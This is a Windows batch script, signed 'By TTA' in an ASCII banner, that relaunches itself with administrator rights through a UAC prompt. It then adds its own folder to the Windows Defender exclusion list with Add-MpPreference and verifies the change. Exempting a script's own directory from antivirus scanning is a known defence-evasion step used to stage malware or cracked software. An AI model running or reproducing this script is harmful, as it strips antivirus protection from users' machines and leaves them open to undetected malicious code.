@echo off
echo  #########  ##       ##   ##########
echo  ##          ##     ##   ##
echo  ##           ##   ##   ##
echo  #########      ##      ##    By TTA
echo  ##           ##   ##   ##
echo  ##         ##      ##   ##
echo  ######### ##         ##  ##########   

:: Run as Administrator
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

:: Add Defender Exclusions
:: Batch script to add its own location to Windows Defender exclusions
:: Requires Administrator privileges

:: Check if running as admin
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo This script requires administrator rights!
    echo Please right-click and select "Run as administrator"
    pause
    exit /b
)

:: Get the directory where this script is located
set "scriptdir=%~dp0"
set "scriptdir=%scriptdir:~0,-1%"  :: Remove trailing backslash

:: Add to Windows Defender exclusions
echo Adding to Windows Defender exclusions: %scriptdir%
powershell -command "Add-MpPreference -ExclusionPath '%scriptdir%'"

:: Verify the addition
echo Checking if the exclusion was added successfully...
powershell -command "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Where-Object { $_ -eq '%scriptdir%' }"

if %ERRORLEVEL% EQU 0 (
    echo Successfully added to Windows Defender exclusions.
) else (
    echo Failed to add to Windows Defender exclusions.
)

pause